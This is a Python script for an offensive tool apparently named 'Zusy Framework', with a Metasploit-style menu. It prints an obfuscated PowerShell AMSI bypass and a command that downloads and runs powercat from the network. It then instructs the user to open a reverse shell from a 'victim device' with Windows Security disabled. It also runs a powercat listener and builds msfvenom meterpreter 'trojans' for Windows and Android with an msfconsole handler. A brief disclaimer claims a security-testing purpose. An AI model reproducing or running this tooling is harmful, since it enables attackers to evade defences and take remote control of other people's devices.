import subprocess
import re
from colorama import Fore
import socket
import os
import time
import signal
import random
blod1 = '\033[1m'
blod2 = '\033[0m'




ascii_art_list = [
    """
       \            _    _            _    
        \          | |  | |          | |   
         \\         | |__| | __ _  ___| | __
          \\        |  __  |/ _` |/ __| |/ /
           >\/7    | |  | | (_| | (__|   < 
       _.-(6'  \   |_|  |_|\__,_|\___|_|\_\\ 
      (=___._/` \         _   _          
           )  \ |        | | | |         
          /   / |        | |_| |__   ___ 
         /    > /        | __| '_ \ / _ \ 
        j    < _\        | |_| | | |  __/
     .-' :      ``.       \__|_| |_|\___|
     \ r=._\        `.
    <`\\_  \         .`-.           _____  _                  _   _ 
     \ r-7  `-. ._  ' .  `\       |  __ \| |                | | | |
      \`,      `-.`7  7)   )      | |__) | | __ _ _ __   ___| |_| |
       \/         \|  \'  / `-._   |  ___/| |/ _` | '_ \ / _ \ __| |
                  ||    .'        | |    | | (_| | | | |  __/ |_|_|
                   \\  (           |_|    |_|\__,_|_| |_|\___|\__(_)
                    >\  >
                 ,.-' >.'					
               <.'_.''                      	               v 1.0
    """,
    """
 ___________
||         ||            _______
||  Zusy   ||           | _____ |
||         ||           ||_____||
||_________||           |  ___  |
|__+_+_+_+__|           | |___| |
    _|_|_   \           |       |
   (_____)   \          |       |
              \    ___  |       |
       ______  \__/   \_|       |
      |   _  |      _/  |       |
      |  ( ) |     /    |_______|
      |___|__|    /             
           \_____/
           		       v 1.0

    """,
    """
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'
                                                                `ZUSY'
                                                                     
                                                                       v 1.0
    """,
    """
___________                     ___________                                               __   
\____    /__ __  _________.__. \_   _____/___________    _____   ______  _  _____________|  | __
  /     /|  |  \/  ___<   |  |  |    __) \_  __ \__  \  /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
 /     /_|  |  /\___ \ \___  |  |     \   |  | \// __ \|  Y Y  \  ___/\     (  <_> )  | \/    < 
/_______ \____//______>/_____|  \_____/   |__|  (______/__|_|__/\_____>\/\_/ \____/|__|  |__|__|
											      		
        									         
        									           v 1.0
        									 
    """,
    """
     _____                 _____                                            _    
    |__  /   _ ___ _   _  |  ___| __ __ _ _ __ ___   _____      _____  _ __| | __
      / / | | / __| | | | | |_ | '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
     / /| |_| \__ \ |_| | |  _|| | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
    /____\__,_|___/\__, | |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\\
                   |___/                                                         
 								            	  v 1.0
    """,
    """
    
           __________                                 
         .'----------`.                              
         | .--------. |                             
         | |########| |       __________              
         | |########| |      /__________\             
.--------| `--------' |------|    --=-- |-------------.
|        `----,-.-----'      |o ======  |             | 
|       ______|_|_______     |__________|             | 
|      /  %%%%%%%%%%%%  \                             | 
|     /  %%%%%%%%%%%%%%  \                            | 
|     ^^^^^^^^^^^^^^^^^^^^                            | 
+-----------------------------------------------------+
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 
    					 		v 1.0
    """
]

def print_random_element():
    random_element = random.choice(ascii_art_list)
    print(random_element)
    
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    finally:
        s.close()

    return local_ip

local_ip = get_local_ip()

shellcommand = f"""

{blod1}Start the Reverse Shell and type these 3 commands in the Powershell of the victim device ({Fore.RED}make sure Windows Security is disabled{Fore.WHITE})

Command 1 :

[Ref].Assembly.GetType('Sy'+'stem.Manag'+'ement.Aut'+'omation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBt'+'AHM'+'AaQBV'+'AHQA'+'aQBsA'+'HMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y'+'QBtAHMA'+'aQ'+'BJAG4A'+'aQB0AEYAY'+'QBpAGwAZQ'+'BkAA=='))),'NonPublic,Static').SetValue($null,$true)

Command 2 :

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

Command 3 :

powercat -c {local_ip} -p 8000 -e cmd {blod2}

"""

def signal_handler(sig, frame):
    print("")
    print(f"\n{blod1}{Fore.RED}[*]{Fore.WHITE} Press 'exit' to close, Press Enter to continue...{blod2}\n")

if __name__ == "__main__":
    local_ip = get_local_ip()
    signal.signal(signal.SIGINT, signal_handler)
    
def loading_animation(string, duration=3):
    start_time = time.time()
    while time.time() - start_time < duration:
        for char in "/-\|":
            print(f"{string} {char}", end='\r')
            time.sleep(0.1)      
    print(" " * (len(string) + 2), end='\r')


def menu():
    current_exploit = ""
    lhost = local_ip
    lport = "8000"
    
    print("")
    loading_animation("[*] Starting Zusy Framework")  
    time.sleep(2)  
    print("")  
    print_random_element()
    
    print("Type '?' or 'help' for available commands")
    print("")
    time.sleep(1.1)
    while True:
        if current_exploit:
            prompt = f"zusy ({blod1}{Fore.RED}{current_exploit}{Fore.WHITE}{blod2}) > "
        else:
            prompt = "zusy > "
        
        try:
            user_input = input(prompt)
        except KeyboardInterrupt:
            continue

        if user_input in ['?', 'help']:
            print("")
            print("Commands:")
            print("")
            print(f" {blod1}use {Fore.RED}exploit/windows/reverseshell{blod2}{Fore.WHITE}  - Windows reverseshell exploit")
            print(f" {blod1}use {Fore.RED}exploit/meterpreter/reverse_tcp{blod2}{Fore.WHITE}  - Meterpreter exploit with Metasploit Framework")
            print("")
            print(f" {blod1}ifconfig{blod2} - Shows you your IP")
            print(f" {blod1}clear{blod2} - Clears the screen")
            print(f" {blod1}exit{blod2} - Exits the tool")
            print(f" {blod1}help_reverseshell{blod2} - Gives information")
            print(f" {blod1}info{blod2} - Info")     
            print("")
            if current_exploit:
                print("  options             - Show options")
                print("  exploit, run        - Exploit the target")
                print("")
            continue
            
        if user_input == 'info':
           print(f"\n{blod1}Credits: No_Name.exe (Zusy)")
           print("")
           print(f"This tool is made for security testing and cybersecurity! We are not responsible for malicious use!")
           print(f"")
           print(f"by Offensive Security and No_Name.exe")
           print("")
           print(f"Github: " + Fore.BLUE + "https://github.com/NoNameZusy/" + Fore.WHITE)
           print("")
           print(f"Youtube: " + Fore.BLUE + "https://www.youtube.com/channel/UCql2YVKt-wF1LFuxhAthcaQ" + Fore.WHITE)
           print("")
           print(f"{blod2}")
           continue
  

        if re.match(r'use\s+(exploit/windows/reverseshell|exploit/meterpreter/reverse_tcp)', user_input):
         current_exploit = user_input.split()[-1]
         print(f"Exploit => {current_exploit}")
        if current_exploit == 'exploit/meterpreter/reverse_tcp':
         create_trojan()
         continue
 
        if user_input == 'options':
            if current_exploit:
                print("\nOptions:")
                print("  ---------------")
                print(f"  LHOST: {lhost}")
                print(f"  LPORT: {lport}")
                print("  ---------------\n")
            else:
                print(f"\n{Fore.RED}{blod1}[*]{Fore.WHITE} No exploit selected{blod2}\n")    

            continue

        if user_input == 'exploit':
            if current_exploit == 'exploit/windows/reverseshell':
                reverseshell(lhost, lport)
            continue
            
        if user_input == 'run':
            if current_exploit == 'exploit/windows/reverseshell':
                reverseshell(lhost, lport)
            continue    
            
        if user_input == 'exit':
            break
            
              

        if user_input == 'ifconfig':
            print("Your IP address:", local_ip)
            
        if user_input == 'help_reverseshell':
            print(shellcommand)    
            
        if user_input == "clear":
            os.system('clear')   
              

def reverseshell(lhost, lport):
    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Starting Listening...")
    time.sleep(5)
    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Started!!!")
    time.sleep(1)
    os.system('clear')
    with open("reverseshell.sh", "w") as f:
        f.write(f"while true; do powercat -l -p 8000 ; done")
    subprocess.run(["bash", "reverseshell.sh"])

def create_trojan():
    print("")
    print("[1] Android")
    print("[2] Windows")
    
    platform_choice = input(f"zusy ({blod1}{Fore.RED}exploit/meterpreter/reverse_tcp{Fore.WHITE}{blod2}) > ")
    
    
    platform = ""
    file_extension = ""
    
    if platform_choice == "1":
        platform = "android"
        file_extension = "apk"
    elif platform_choice == "2":
        platform = "windows"
        file_extension = "exe"
    else:
        print(f"{Fore.RED}{blod1}[*]{Fore.WHITE} Invalid choice{blod2}")
        create_trojan()
    
    print("")
    lhost = input("LHOST = ")
    if not lhost:
        lhost = get_local_ip()
        if not lhost:
            print("Failed to get Kali Linux IP address.")
            input("\nPress Enter to back...")
            menu()
    
    lport = input("LPORT = ")
    filedirectory = input("Please enter the file name: ")
    
    trojan_command = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filedirectory}.{file_extension}"
    
    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Please Wait...")
                    
    process = subprocess.run(trojan_command, shell=True)
    if process.returncode == 0:
        print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
        print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Starting Listening...")
        msf_command = f"use exploit/multi/handler; set payload {platform}/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4242; exploit"
        subprocess.run(f"msfconsole -q -x '{msf_command}'", shell=True)
    else:
        print("Trojan creation failed.")
        

if __name__ == "__main__":
    menu()
